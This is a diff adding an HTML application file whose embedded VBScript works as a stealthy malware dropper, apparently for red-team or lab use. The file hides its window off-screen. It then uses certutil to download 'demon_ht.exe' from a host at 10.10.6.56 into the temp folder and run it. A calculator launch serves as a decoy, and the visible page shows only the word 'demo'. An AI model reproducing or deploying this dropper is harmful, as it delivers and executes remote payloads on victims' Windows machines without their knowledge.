@@ -1,0 +1,16 @@
+<HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "certutil.exe -urlcache -split -f http://10.10.6.56:8000/demon_ht.exe %TEMP%\\demon_ht.exe & %TEMP%\\demon_ht.exe"
+objShell.Run "calc.exe"
+self.close
+</script>
+<body>
+    demo
+</body>
+</HEAD>
+</HTML>
